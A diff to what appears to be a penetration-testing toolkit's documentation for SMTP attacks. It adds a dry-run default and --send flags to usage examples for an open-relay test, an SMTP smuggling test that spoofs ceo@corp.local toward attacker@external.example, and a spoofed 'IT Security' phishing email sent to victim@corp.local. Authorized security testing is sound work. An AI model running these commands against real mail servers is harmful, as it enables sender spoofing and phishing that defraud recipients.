@@ -33,19 +33,22 @@ smtp/
 # 4. Open-relay variations (19 classic test cases)
 ./smtp-relay-test.sh --target mail.corp:25 --internal-domain corp.local
 
-# 5. SMTP smuggling
+# 5. SMTP smuggling — DRY-RUN by default; add --send to actually transmit DATA payloads.
 ./smtp-smuggling-test.py --target mail.corp:25 \\
     --rcpt-to postmaster@corp.local \\
     --smuggle-from ceo@corp.local \\
     --smuggle-to attacker@external.example \\
-    --variant all
+    --variant all \\
+    --send
 
-# 6. Send a spoofed phish (after confirming relay/internal-relay is open)
+# 6. Send a spoofed phish (after confirming relay/internal-relay is open).
+#    DRY-RUN by default; add --send to actually deliver.
 ./smtp-phish-send.sh --target mail.corp:25 \\
     --from 'security@corp.local' --from-name 'IT Security' \\
     --to 'victim@corp.local' \\
     --subject 'Mandatory MFA enrollment' \\
-    --html --body-file phish-email.html
+    --html --body-file phish-email.html \\
+    --send
 ```
 
 ## Exploitability Tier (`smtp-quickwin.sh`)
